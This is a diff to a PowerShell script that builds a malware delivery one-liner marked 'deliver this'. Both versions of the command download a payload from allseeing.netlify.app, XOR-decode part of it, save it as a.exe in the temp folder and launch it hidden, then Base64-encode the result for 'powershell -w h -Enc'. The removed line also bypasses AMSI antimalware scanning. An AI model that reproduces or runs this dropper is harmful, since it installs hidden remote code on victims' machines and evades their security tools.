@@ -95,7 +95,7 @@ try {
     } else { Write-Output "WARNING: GITHUB_TOKEN not set, skipping GitHub upload" }
     Write-Output ""
     Write-Output "=== ONE-LINER (deliver this) ==="
-    $rawCmd = "try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)}catch{};`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');if(`$b.Length-gt0x80){for(`$i=0x40;`$i-lt0x80;`$i++){`$b[`$i]=`$b[`$i]-bxor0x41}};[IO.File]::WriteAllBytes(`"`$env:tmp\a.exe`",`$b);Start-Process -WindowStyle Hidden `"`$env:tmp\a.exe`""
+    $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');if(`$b.Length-gt0x80){for(`$i=0x40;`$i-lt0x80;`$i++){`$b[`$i]=`$b[`$i]-bxor0x41}};[IO.File]::WriteAllBytes(`"`$env:tmp\a.exe`",`$b);Start-Process -WindowStyle Hidden `"`$env:tmp\a.exe`""
     $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
     $encCmd = [Convert]::ToBase64String($encBytes)
     Write-Output "powershell -w h -Enc $encCmd"
